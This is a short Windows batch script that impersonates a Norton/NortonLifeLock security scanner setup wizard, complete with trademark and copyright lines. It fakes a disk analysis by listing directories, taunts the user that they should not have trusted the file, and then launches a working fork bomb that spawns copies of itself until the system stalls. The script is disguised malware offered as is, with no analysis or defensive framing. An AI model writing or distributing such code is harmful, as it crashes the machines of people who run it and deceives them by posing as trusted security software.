
REM   Once a classic, always a classic. 

@echo off

echo:
echo 		NORTON SECURITY SCANNER - 2020 (Norton LifeLock SELECT)
echo 		*******************************************************
echo:
echo: Welcome to the setup wizard for NORTON MALWARE ANALYSER.
echo:
echo: Detect and block viruses, malware, spyware, ransomware and phishing. 
echo: We use smart analytics to stop threats before they affect you. 


echo:
echo: 
echo	     	Logo are trademarks or registered trademarks of NortonLifeLock Inc. 
echo 		Copyright © 2020 NortonLifeLock Inc. All rights reserved.
echo:
echo:

REM   Displays the system tree as it were "analyzing"   

echo Procceding to anaylise the computer HDD [C://...]
echo:

pause

cd /
dir
tree /f
dir
tree /f
dir

echo:
echo:
echo:System analysis completed.
echo:
echo: 
pause

REM  Just a message to the user  

for /l %%x in (1, 1, 100) do (
   
   echo: That was a mistake, pal.
   echo: You shouldn't have trusted this file.  
)

REM The actual fork bomb, really...that's it. 

:s
start %0
goto s

